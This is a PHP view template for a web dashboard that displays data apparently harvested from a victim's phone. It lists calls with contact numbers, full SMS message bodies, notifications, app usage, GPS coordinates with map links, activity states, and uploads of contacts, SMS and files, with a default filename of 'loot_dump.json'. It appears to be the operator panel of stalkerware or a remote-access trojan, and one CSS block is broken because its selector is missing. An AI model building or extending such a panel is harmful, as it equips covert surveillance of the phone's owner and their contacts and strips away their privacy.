<?php
/** @var array $events @var int $total @var object $pager @var string $nav_urls */

// Use global telemetry counts passed from the base controller to avoid showing zeros for paginated data
$typeCounts = [
    'call' => $total_calls ?? 0,
    'sms' => $total_sms ?? 0,
    'notification' => $total_notifications ?? 0,
    'app_usage' => $total_app_usage ?? 0,
    'location' => $total_locations ?? 0,
    'activity' => $total_activities ?? 0,
    'upload' => $total_media ?? 0,
    'other' => 0
];
?>
<style>
@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap');

.content-wrapper *:not(i) {
    font-family: 'Outfit', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}

/* Base structural layout */
.tl-card {
    border-radius: 20px;
    border: none;
    box-shadow: 0 10px 30px rgba(0,0,0,0.06);
    background: #ffffff;
    overflow: hidden;
}

/* Header hover glow button */
.hover-grow {
    transition: all 0.25s ease;
}
.hover-grow:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.15) !important;
}

    border-radius: 16px;
    padding: 16px 20px;
    background: #ffffff;
    border: 1px solid rgba(0,0,0,0.04);
    box-shadow: 0 4px 16px rgba(0,0,0,0.03);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    position: relative;
    overflow: hidden;
}
.tl-body:hover {
    transform: translateY(-2.5px);
    box-shadow: 0 10px 25px rgba(0,0,0,0.08);
}

/* Decorative background glowing orb on cards */
.tl-body::after {
    content: '';
    position: absolute;
    top: 0;
    right: 0;
    width: 80px;
    height: 80px;
    border-radius: 50%;
    filter: blur(35px);
    opacity: 0.12;
    z-index: 1;
    pointer-events: none;
}

/* Event type colors */
.ev-call      { border-left: 4px solid #10b981; }
.ev-call .tl-icon-wrap      { background: linear-gradient(135deg, #10b981, #059669); color: #fff; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.35); }
.ev-call::after             { background: #10b981; }

.ev-sms       { border-left: 4px solid #3b82f6; }
.ev-sms .tl-icon-wrap       { background: linear-gradient(135deg, #3b82f6, #2563eb); color: #fff; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35); }
.ev-sms::after              { background: #3b82f6; }

.ev-notif     { border-left: 4px solid #f59e0b; }
.ev-notif .tl-icon-wrap     { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; box-shadow: 0 4px 12px rgba(245, 158, 11, 0.35); }
.ev-notif::after            { background: #f59e0b; }

.ev-app       { border-left: 4px solid #8b5cf6; }
.ev-app .tl-icon-wrap       { background: linear-gradient(135deg, #8b5cf6, #7c3aed); color: #fff; box-shadow: 0 4px 12px rgba(139, 92, 246, 0.35); }
.ev-app::after              { background: #8b5cf6; }

.ev-loc       { border-left: 4px solid #ef4444; }
.ev-loc .tl-icon-wrap       { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.35); }
.ev-loc::after              { background: #ef4444; }

.ev-activ     { border-left: 4px solid #06b6d4; }
.ev-activ .tl-icon-wrap     { background: linear-gradient(135deg, #06b6d4, #0891b2); color: #fff; box-shadow: 0 4px 12px rgba(6, 182, 212, 0.35); }
.ev-activ::after            { background: #06b6d4; }

/* Upload custom subclasses styling */
.ev-upload-bt        { border-left: 4px solid #3b82f6; }
.ev-upload-bt .tl-icon-wrap   { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: #fff; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.35); }
.ev-upload-bt::after          { background: #3b82f6; }

.ev-upload-files     { border-left: 4px solid #10b981; }
.ev-upload-files .tl-icon-wrap { background: linear-gradient(135deg, #10b981, #047857); color: #fff; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.35); }
.ev-upload-files::after        { background: #10b981; }

.ev-upload-apps      { border-left: 4px solid #8b5cf6; }
.ev-upload-apps .tl-icon-wrap  { background: linear-gradient(135deg, #8b5cf6, #6d28d9); color: #fff; box-shadow: 0 4px 12px rgba(139, 92, 246, 0.35); }
.ev-upload-apps::after         { background: #8b5cf6; }

.ev-upload-contacts  { border-left: 4px solid #f97316; }
.ev-upload-contacts .tl-icon-wrap { background: linear-gradient(135deg, #f97316, #ea580c); color: #fff; box-shadow: 0 4px 12px rgba(249, 115, 22, 0.35); }
.ev-upload-contacts::after         { background: #f97316; }

.ev-upload-sms       { border-left: 4px solid #ec4899; }
.ev-upload-sms .tl-icon-wrap { background: linear-gradient(135deg, #ec4899, #db2777); color: #fff; box-shadow: 0 4px 12px rgba(236, 72, 153, 0.35); }
.ev-upload-sms::after        { background: #ec4899; }

.ev-upload-calls     { border-left: 4px solid #14b8a6; }
.ev-upload-calls .tl-icon-wrap { background: linear-gradient(135deg, #14b8a6, #0d9488); color: #fff; box-shadow: 0 4px 12px rgba(20, 184, 166, 0.35); }
.ev-upload-calls::after        { background: #14b8a6; }

.ev-upload-location  { border-left: 4px solid #84cc16; }
.ev-upload-location .tl-icon-wrap { background: linear-gradient(135deg, #84cc16, #65a30d); color: #fff; box-shadow: 0 4px 12px rgba(132, 204, 22, 0.35); }
.ev-upload-location::after        { background: #84cc16; }

.ev-upload-other     { border-left: 4px solid #6b7280; }
.ev-upload-other .tl-icon-wrap { background: linear-gradient(135deg, #6b7280, #4b5563); color: #fff; box-shadow: 0 4px 12px rgba(107, 114, 128, 0.35); }
.ev-upload-other::after        { background: #6b7280; }

.ev-other            { border-left: 4px solid #6b7280; }
.ev-other .tl-icon-wrap      { background: linear-gradient(135deg, #6b7280, #4b5563); color: #fff; }
.ev-other::after             { background: #6b7280; }

/* Internal details styling */
.tl-time {
    font-size: 0.75rem;
    font-weight: 700;
    color: #64748b;
    float: right;
    background: #f1f5f9;
    padding: 3px 10px;
    border-radius: 20px;
    margin-top: -2px;
}
.tl-title {
    font-size: 0.98rem;
    font-weight: 700;
    color: #0f172a;
    margin-bottom: 6px;
    position: relative;
    z-index: 2;
}
.tl-sub {
    font-size: 0.86rem;
    color: #475569;
    line-height: 1.5;
    position: relative;
    z-index: 2;
}

/* Custom details cards */
.sms-bubble {
    background: #f8fafc;
    border-left: 3.5px solid #3b82f6;
    border-radius: 0 14px 14px 14px;
    padding: 10px 14px;
    margin-top: 8px;
    font-size: 0.85rem;
    color: #334155;
    line-height: 1.45;
}
.call-badge {
    display: inline-flex;
    align-items: center;
    font-size: 0.72rem;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 20px;
    gap: 4px;
}
.call-in   { background: #d1fae5; color: #065f46; }
.call-out  { background: #dbeafe; color: #1e40af; }
.call-miss { background: #fee2e2; color: #991b1b; }

.badge-tag {
    font-size: 0.72rem;
    font-weight: 600;
    padding: 3px 10px;
    border-radius: 20px;
    background: #f1f5f9;
    color: #475569;
    display: inline-flex;
    align-items: center;
    gap: 4px;
}

/* Filter pills toolbar */
.filter-pill {
    cursor: pointer;
    user-select: none;
    border-radius: 50px;
    padding: 5px 16px;
    font-size: 0.8rem;
    font-weight: 600;
    border: 2px solid transparent;
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    display: inline-flex;
    align-items: center;
    gap: 6px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.03);
}
.filter-pill:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
}
.filter-pill.active {
    border-color: currentColor;
    opacity: 1 !important;
}
.filter-pill:not(.active) {
    opacity: 0.5;
    background: #f1f5f9 !important;
    color: #64748b !important;
}

/* Map link button */
.map-link-btn {
    display: inline-flex;
    align-items: center;
    font-size: 0.75rem;
    font-weight: 700;
    color: #4f46e5;
    background: #eeebff;
    padding: 4px 12px;
    border-radius: 8px;
    margin-top: 8px;
    transition: all 0.2s;
    border: none;
    text-decoration: none !important;
}
.map-link-btn:hover {
    background: #4f46e5;
    color: #fff;
    transform: translateY(-1px);
}
</style>

<div class="content-wrapper">
    <section class="content-header" style="padding: 20px 0 10px 0;">
        <div class="container-fluid">
            <!-- Glassmorphic Premium Header Block -->
            <div class="row align-items-stretch mb-4">
                <!-- Main Header Card -->
                <div class="col-xl-8 col-lg-7 d-flex">
                    <div class="card w-100 border-0 shadow-lg text-white" style="background: linear-gradient(135deg, #1e1b4b, #2e1065); border-radius: 20px; overflow: hidden; position: relative;">
                        <div style="position: absolute; top: -50px; right: -50px; width: 220px; height: 220px; background: radial-gradient(circle, rgba(139,92,246,0.3) 0%, transparent 70%); filter: blur(25px);"></div>
                        <div style="position: absolute; bottom: -50px; left: -50px; width: 250px; height: 250px; background: radial-gradient(circle, rgba(79,70,229,0.25) 0%, transparent 70%); filter: blur(35px);"></div>
                        
                        <div class="card-body p-4 d-flex flex-column justify-content-between" style="position: relative; z-index: 2;">
                            <div>
                                <span class="badge text-white mb-2 px-3 py-1.5" style="border-radius: 30px; font-weight: 700; font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; background: rgba(255,255,255,0.12); backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1);">
                                    <i class="fas fa-satellite-dish mr-1 text-info"></i> Raw Device Stream
                                </span>
                                <h1 class="font-weight-bold mb-2" style="font-size: 2.2rem; letter-spacing: -0.02em;">Device Telemetry Timeline</h1>
                                <p class="text-white-50 mb-4" style="font-size: 0.95rem; font-weight: 300; opacity: 0.85; max-width: 650px;">A comprehensive, raw chronological event log containing active physical activities, geographical coordinate updates, and data package uploads extracted directly from the system container.</p>
                            </div>
                            
                            <div class="d-flex align-items-center justify-content-between flex-wrap" style="gap: 15px;">
                                <div class="d-flex align-items-center" style="gap: 12px;">
                                    <div class="rounded-circle d-flex align-items-center justify-content-center" style="width: 50px; height: 50px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12);">
                                        <i class="fas fa-stream text-info"></i>
                                    </div>
                                    <div>
                                        <div class="text-white-50" style="font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;">Total Stream Events</div>
                                        <div class="h3 font-weight-bold mb-0" style="font-size: 1.5rem; color: #67e8f9;"><?= number_format($total ?? 0) ?></div>
                                    </div>
                                </div>
                                <div>
                                    <a href="<?= base_url('analysis/timeline') ?>" class="btn btn-light font-weight-bold shadow-sm hover-grow" style="border-radius: 12px; font-size: 0.85rem; padding: 10px 22px;">
                                        <i class="fas fa-brain mr-1.5 text-primary"></i> Intelligence Timeline
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Mini Stats Progress Dashboard -->
                <div class="col-xl-4 col-lg-5 d-flex">
                    <div class="card w-100 border-0 shadow-lg" style="border-radius: 20px; background: #ffffff;">
                        <div class="card-body p-4 d-flex flex-column justify-content-between">
                            <div>
                                <h5 class="font-weight-bold text-dark mb-2" style="font-size: 1.05rem;"><i class="fas fa-chart-pie mr-2 text-primary"></i>Stream Distribution</h5>
                                <p class="text-muted small mb-3">Relative frequency weight of each telemetry vector captured in local buffer.</p>
                                
                                <div class="progress mb-4" style="height: 12px; border-radius: 20px; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);">
                                    <?php 
                                    $totalTypes = array_sum($typeCounts);
                                    if ($totalTypes > 0):
                                        foreach ($typeCounts as $k => $c):
                                            $pct = ($c / $totalTypes) * 100;
                                            if ($pct > 0):
                                                $col = '#6b7280';
                                                if ($k === 'call') $col = '#10b981';
                                                elseif ($k === 'sms') $col = '#3b82f6';
                                                elseif ($k === 'notification') $col = '#f59e0b';
                                                elseif ($k === 'app_usage') $col = '#8b5cf6';
                                                elseif ($k === 'location') $col = '#ef4444';
                                                elseif ($k === 'activity') $col = '#06b6d4';
                                                elseif ($k === 'upload') $col = '#14b8a6';
                                    ?>
                                    <div class="progress-bar" role="progressbar" style="width: <?= $pct ?>%; background-color: <?= $col ?>;" aria-valuenow="<?= $pct ?>" aria-valuemin="0" aria-valuemax="100" title="<?= ucfirst($k) ?>: <?= number_format($c) ?>"></div>
                                    <?php 
                                            endif;
                                        endforeach;
                                    endif;
                                    ?>
                                </div>
                            </div>
                            
                            <div class="row g-2">
                                <div class="col-6">
                                    <div class="p-3 bg-light rounded text-center" style="border-radius: 12px;">
                                        <div class="text-muted small" style="font-size: 0.72rem;">Device Connection</div>
                                        <div class="h6 font-weight-bold text-success mb-0 mt-1"><i class="fas fa-link mr-1"></i> Connected</div>
                                    </div>
                                </div>
                                <div class="col-6">
                                    <div class="p-3 bg-light rounded text-center" style="border-radius: 12px;">
                                        <div class="text-muted small" style="font-size: 0.72rem;">Data Integrity</div>
                                        <div class="h6 font-weight-bold text-primary mb-0 mt-1"><i class="fas fa-shield-alt mr-1"></i> Verified</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Sleek Control Toolbar -->
            <div class="card border-0 shadow-sm mb-4" style="border-radius: 16px;">
                <div class="card-body p-3">
                    <div class="row align-items-center">
                        <!-- Left: Live Search Box -->
                        <div class="col-lg-4 col-md-5 mb-2 mb-md-0">
                            <div class="input-group">
                                <span class="input-group-text bg-light border-0 text-muted" style="border-top-left-radius: 12px; border-bottom-left-radius: 12px; padding-left: 16px;">
                                    <i class="fas fa-search"></i>
                                </span>
                                <input type="text" id="timeline-search" class="form-control bg-light border-0" placeholder="Type to filter titles, numbers, labels..." style="border-top-right-radius: 12px; border-bottom-right-radius: 12px; box-shadow: none; font-size: 0.88rem; height: 42px; padding-left: 5px;">
                            </div>
                        </div>
                        
                        <!-- Right: Advanced Pill Filters -->
                        <div class="col-lg-8 col-md-7 text-md-right">
                            <div class="d-flex flex-wrap align-items-center justify-content-md-end" style="gap: 6px;">
                                <span class="filter-pill active" style="background:#e8f8f5;color:#0e6251;" data-filter="call">
                                    <i class="fas fa-phone mr-1"></i> Calls <span class="badge bg-success text-white ml-1"><?= $typeCounts['call'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#ebf5fb;color:#1b4f72;" data-filter="sms">
                                    <i class="fas fa-envelope mr-1"></i> SMS <span class="badge bg-primary text-white ml-1"><?= $typeCounts['sms'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#fef9e7;color:#7d6608;" data-filter="notification">
                                    <i class="fas fa-bell mr-1"></i> Alerts <span class="badge bg-warning text-dark ml-1"><?= $typeCounts['notification'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#f5eef8;color:#4a235a;" data-filter="app_usage">
                                    <i class="fas fa-cube mr-1"></i> Apps <span class="badge bg-purple text-white ml-1" style="background:#7d3c98;"><?= $typeCounts['app_usage'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#fdebd0;color:#78281f;" data-filter="location">
                                    <i class="fas fa-map-marker-alt mr-1"></i> Location <span class="badge bg-danger text-white ml-1"><?= $typeCounts['location'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#eaf2f8;color:#1f618d;" data-filter="activity">
                                    <i class="fas fa-running mr-1"></i> Activity <span class="badge bg-info text-white ml-1"><?= $typeCounts['activity'] ?></span>
                                </span>
                                <span class="filter-pill active" style="background:#e8f8f5;color:#0b5345;" data-filter="upload">
                                    <i class="fas fa-upload mr-1"></i> Uploads <span class="badge bg-teal text-white ml-1"><?= $typeCounts['upload'] ?></span>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Timeline Event Feed Section -->
    <section class="content">
        <div class="container-fluid">
            <?php if (empty($events)): ?>
                <div class="text-center py-5">
                    <i class="fas fa-stream fa-3x text-muted mb-3 d-block"></i>
                    <h4 class="text-muted">No telemetry events found</h4>
                    <p class="text-muted">Device database events will appear here once telemetry feeds synchronize.</p>
                </div>
            <?php else: 
                $lastDate = '';
            ?>
                <div class="timeline" id="tl-container">
                <?php
                foreach ($events as $ev):
                    $ts       = (int)(($ev['timestamp_ms'] ?? 0) / 1000);
                    $dateStr  = date('l, F j, Y', $ts);
                    $timeStr  = date('H:i:s', $ts);
                    $type     = $ev['event_type'] ?? 'other';

                    // Set default variables
                    $icon = 'fas fa-info-circle'; 
                    $bgClass = 'bg-secondary';
                    $title = '';
                    $sub = '';

                    // Per-type complex visual structuring
                    switch ($type) {
                        case 'call':
                            $icon = 'fas fa-phone'; 
                            $bgClass = 'bg-success';
                            $dir = strtolower($ev['meta1'] ?? '');
                            
                            if (stripos($dir, 'missed') !== false || stripos($dir, 'rejected') !== false) {
                                $badge = '<span class="badge badge-danger ml-2"><i class="fas fa-phone-slash mr-1"></i>' . esc(ucfirst($dir)) . '</span>';
                                $bgClass = 'bg-danger';
                            } elseif (stripos($dir, 'outgoing') !== false) {
                                $badge = '<span class="badge badge-success ml-2"><i class="fas fa-phone-volume mr-1"></i>' . esc(ucfirst($dir)) . '</span>';
                            } else {
                                $badge = '<span class="badge badge-info ml-2"><i class="fas fa-phone-alt mr-1"></i>' . esc(ucfirst($dir)) . '</span>';
                            }
                            
                            $title = 'Voice Call Logs ' . $badge;
                            $num = esc($ev['subtitle'] ?? '');
                            $durationSec = (int)($ev['meta2'] ?? 0);
                            if ($durationSec < 60) {
                                $durationFormatted = $durationSec . 's';
                            } elseif ($durationSec < 3600) {
                                $durationFormatted = floor($durationSec / 60) . 'm ' . ($durationSec % 60) . 's';
                            } else {
                                $durationFormatted = floor($durationSec / 3600) . 'h ' . floor(($durationSec % 3600) / 60) . 'm';
                            }
                            
                            $sub = 'Contact: <b>' . esc($ev['title'] ?? 'Unknown Caller') . '</b> (' . $num . ') <br><span class="badge badge-light border mt-1"><i class="fas fa-hourglass-half mr-1 text-muted"></i>Duration: ' . $durationFormatted . '</span>';
                            break;
                            
                        case 'sms':
                            $icon = 'fas fa-envelope'; 
                            $bgClass = 'bg-primary';
                            $dir = strtolower($ev['meta1'] ?? '');
                            $badge = ($dir === 'sent') ? '<span class="badge badge-primary ml-2"><i class="fas fa-paper-plane mr-1"></i>Sent</span>' : '<span class="badge badge-info ml-2"><i class="fas fa-reply mr-1"></i>Inbox</span>';
                            
                            $title = 'SMS Transmission Logs ' . $badge;
                            $body = $ev['meta2'] ?? '';
                            $sender = esc($ev['title'] ?? 'Unknown');
                            
                            $sub = 'Sender/Recipient: <b>' . $sender . '</b>';
                            if (!empty($body)) {
                                $sub .= '<div class="p-2 mt-2 bg-light rounded border">' . esc($body) . '</div>';
                            }
                            break;
                            
                        case 'notification':
                            $icon = 'fas fa-bell'; 
                            $bgClass = 'bg-warning';
                            $title = 'System Push Alert — ' . esc($ev['title'] ?? 'Notification');
                            $appName = $ev['meta1'] ?? '';
                            $pkg = esc($ev['subtitle'] ?? '');
                            
                            $sub = '<span class="badge badge-warning mb-2"><i class="fas fa-mobile-alt mr-1"></i>' . esc($appName ?: $pkg) . '</span>';
                            if (!empty($ev['meta2'])) {
                                $sub .= '<div class="p-2 mt-1 bg-light rounded border border-warning">' . esc($ev['meta2']) . '</div>';
                            }
                            break;
                            
                        case 'app_usage':
                            $icon = 'fas fa-cube'; 
                            $bgClass = 'bg-indigo';
                            $title = 'Application Opened';
                            $appName = esc($ev['title'] ?? '');
                            $pkg = esc($ev['subtitle'] ?? '');
                            $ms = (int)($ev['meta2'] ?? 0);
                            $sec = (int)($ms / 1000);
                            if ($ms <= 0) {
                                $durFormatted = 'Foreground Interval';
                            } elseif ($sec < 3600) {
                                $durFormatted = floor($sec / 60) . 'm ' . ($sec % 60) . 's';
                            } elseif ($sec < 86400) {
                                $durFormatted = floor($sec / 3600) . 'h ' . floor(($sec % 3600) / 60) . 'm';
                            } else {
                                $durFormatted = floor($sec / 86400) . 'd ' . floor(($sec % 86400) / 3600) . 'h';
                            }
                            
                            $sub = 'App: <b>' . $appName . '</b> <small class="text-muted">(' . $pkg . ')</small><br>' .
                                   '<span class="badge bg-purple mt-2"><i class="fas fa-stopwatch mr-1"></i>Active Duration: ' . $durFormatted . '</span>';
                            break;
                            
                        case 'location':
                            $icon = 'fas fa-map-marker-alt'; 
                            $bgClass = 'bg-danger';
                            $acc = esc($ev['title'] ?? 'GPS');
                            $title = 'Coordinates Capture <span class="badge badge-danger ml-2"><i class="fas fa-crosshairs mr-1"></i>' . $acc . ' accuracy</span>';
                            $lat = esc($ev['meta1'] ?? '');
                            $lng = esc($ev['meta2'] ?? '');
                            
                            $sub = 'Latitude: <code>' . $lat . '</code>, Longitude: <code>' . $lng . '</code>';
                            if (!empty($lat) && !empty($lng)) {
                                $sub .= '<br><a href="https://www.openstreetmap.org/?mlat=' . $lat . '&mlon=' . $lng . '#map=17/' . $lat . '/' . $lng . '" target="_blank" class="btn btn-xs btn-outline-danger mt-2"><i class="fas fa-map-marked-alt mr-1"></i>View Map Coordinates</a>';
                            }
                            break;
                            
                        case 'activity':
                            $actType = strtolower($ev['title'] ?? 'unknown');
                            if ($actType === 'still' || $actType === 'sleeping') {
                                $icon = 'fas fa-bed';
                            } elseif (in_array($actType, ['walking', 'on_foot'])) {
                                $icon = 'fas fa-walking';
                            } elseif ($actType === 'running') {
                                $icon = 'fas fa-running';
                            } elseif (in_array($actType, ['driving', 'in_vehicle'])) {
                                $icon = 'fas fa-car';
                            } elseif ($actType === 'tilting') {
                                $icon = 'fas fa-phone-slash';
                            } else {
                                $icon = 'fas fa-running';
                            }
                            $bgClass = 'bg-info';
                            $title = 'Device Activity Transition';
                            $confidence = (int)($ev['meta1'] ?? 0);
                            $status = esc($ev['meta2'] ?? 'Active');
                            
                            $sub = 'Detected State: <b class="text-info text-capitalize">' . esc($ev['title'] ?? 'Unknown') . '</b><br>' .
                                   '<span class="badge badge-info mt-2 mr-2"><i class="fas fa-percentage mr-1"></i>Confidence: ' . $confidence . '%</span>' .
                                   '<span class="badge badge-light border mt-2"><i class="fas fa-info-circle mr-1"></i>Status: ' . $status . '</span>';
                            break;
                            
                        case 'upload':
                            $cat = strtolower($ev['subtitle'] ?? 'other');
                            if (in_array($cat, ['bluetooth', 'bt'])) {
                                $icon = 'fab fa-bluetooth'; $bgClass = 'bg-primary';
                                $catLabel = 'Bluetooth Stream Audit';
                            } elseif (in_array($cat, ['files', 'file'])) {
                                $icon = 'fas fa-file-archive'; $bgClass = 'bg-success';
                                $catLabel = 'FileSystem Archive Upload';
                            } elseif (in_array($cat, ['apps', 'app'])) {
                                $icon = 'fas fa-mobile-alt'; $bgClass = 'bg-indigo';
                                $catLabel = 'App List Payload';
                            } elseif (in_array($cat, ['contacts', 'contact'])) {
                                $icon = 'fas fa-address-book'; $bgClass = 'bg-warning';
                                $catLabel = 'Contacts Buffer Export';
                            } elseif ($cat === 'sms') {
                                $icon = 'fas fa-comments'; $bgClass = 'bg-danger';
                                $catLabel = 'SMS Data Archive';
                            } elseif (in_array($cat, ['logs', 'call'])) {
                                $icon = 'fas fa-phone-square'; $bgClass = 'bg-info';
                                $catLabel = 'Voice Call Logs Audit';
                            } elseif ($cat === 'location') {
                                $icon = 'fas fa-map-pin'; $bgClass = 'bg-maroon';
                                $catLabel = 'Coordinates Buffer Upload';
                            } else {
                                $icon = 'fas fa-upload'; $bgClass = 'bg-secondary';
                                $catLabel = ucfirst($cat) . ' Payloads';
                            }
                            
                            $title = 'Data Payload Uploaded';
                            $filename = esc($ev['title'] ?? 'loot_dump.json');
                            $sizeBytes = (int)($ev['meta1'] ?? 0);
                            
                            // Format file size
                            $units = ['B', 'KB', 'MB', 'GB'];
                            $power = $sizeBytes > 0 ? floor(log($sizeBytes, 1024)) : 0;
                            $formattedSize = number_format($sizeBytes / pow(1024, $power), 2) . ' ' . $units[$power];
                            
                            $sub = '<span class="badge badge-light border mr-2 mb-2"><i class="' . $icon . ' mr-1"></i>File category: ' . $catLabel . '</span><br>' .
                                   '<span class="badge badge-success mt-1 mr-2"><i class="fas fa-file mr-1"></i>File: ' . $filename . '</span>' .
                                   '<span class="badge badge-light border mt-1"><i class="fas fa-hdd mr-1 text-muted"></i>Size: ' . $formattedSize . '</span>';
                            break;
                            
                        default:
                            $icon = 'fas fa-info-circle'; $bgClass = 'bg-secondary';
                            $title = esc($ev['title'] ?? 'Telemetry Event');
                            $sub = esc($ev['subtitle'] ?? '');
                            break;
                    }

                    if ($dateStr !== $lastDate):
                        $lastDate = $dateStr;
                ?>
                    <!-- timeline time label -->
                    <div class="time-label tl-date-divider" data-date="<?= esc($dateStr) ?>">
                        <span class="bg-dark"><?= esc($dateStr) ?></span>
                    </div>
                <?php endif; ?>
                    <!-- timeline item -->
                    <div class="tl-event" data-type="<?= esc($type) ?>">
                        <i class="<?= $icon ?> <?= $bgClass ?>"></i>
                        <div class="timeline-item">
                            <span class="time"><i class="fas fa-clock"></i> <?= $timeStr ?></span>
                            <h3 class="timeline-header font-weight-bold"><?= $title ?></h3>
                            <?php if (!empty($sub)): ?>
                            <div class="timeline-body">
                                <?= $sub ?>
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                <?php endforeach; ?>
                    <div>
                        <i class="fas fa-clock bg-gray"></i>
                    </div>
                </div>
            <?php endif; ?>
                <?php if (isset($pager)): ?>
                <div class="card-footer bg-transparent border-0 text-right pb-4 pr-4">
                    <?= $pager->links('default', 'bootstrap5_full') ?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </section>
</div>

<script>
// Search Input Filter
document.getElementById('timeline-search').addEventListener('input', function() {
    var query = this.value.toLowerCase().trim();
    var activeFilters = Array.from(document.querySelectorAll('.filter-pill.active')).map(p => p.dataset.filter);
    
    document.querySelectorAll('#tl-container .tl-event').forEach(function(ev) {
        var text = ev.innerText.toLowerCase();
        var matchesSearch = text.includes(query);
        var matchesFilter = activeFilters.includes(ev.dataset.type);
        
        ev.style.display = (matchesSearch && matchesFilter) ? 'flex' : 'none';
    });
    
    // Toggle date dividers that have no visible events below them
    document.querySelectorAll('#tl-container .tl-date-divider').forEach(function(div) {
        var next = div.nextElementSibling;
        var hasVisible = false;
        while (next && !next.classList.contains('tl-date-divider')) {
            if (next.classList.contains('tl-event') && next.style.display !== 'none') hasVisible = true;
            next = next.nextElementSibling;
        }
        div.style.display = hasVisible ? 'flex' : 'none';
    });
});

// Category Filter Pills Toggle
document.querySelectorAll('.filter-pill').forEach(function(pill) {
    pill.addEventListener('click', function() {
        var allPills = document.querySelectorAll('.filter-pill');
        var isActive = this.classList.contains('active');
        var activeCount = document.querySelectorAll('.filter-pill.active').length;
        
        if (isActive && activeCount === 1) {
            // If it's the only one active and clicked, reset to show all
            allPills.forEach(function(p) { p.classList.add('active'); });
        } else {
            // Otherwise, make ONLY this one active (exclusive select)
            allPills.forEach(function(p) { p.classList.remove('active'); });
            this.classList.add('active');
        }
        
        var query = document.getElementById('timeline-search').value.toLowerCase().trim();
        var activeFilters = Array.from(document.querySelectorAll('.filter-pill.active')).map(p => p.dataset.filter);
        
        document.querySelectorAll('#tl-container .tl-event').forEach(function(ev) {
            var text = ev.innerText.toLowerCase();
            var matchesSearch = text.includes(query);
            var matchesFilter = activeFilters.includes(ev.dataset.type);
            
            ev.style.display = (matchesSearch && matchesFilter) ? 'flex' : 'none';
        });
        
        // Hide date dividers with no visible events below them
        document.querySelectorAll('#tl-container .tl-date-divider').forEach(function(div) {
            var next = div.nextElementSibling;
            var hasVisible = false;
            while (next && !next.classList.contains('tl-date-divider')) {
                if (next.classList.contains('tl-event') && next.style.display !== 'none') hasVisible = true;
                next = next.nextElementSibling;
            }
            div.style.display = hasVisible ? 'flex' : 'none';
        });
    });
});
</script>
<?php include __DIR__ . '/_adv_style.php'; ?>
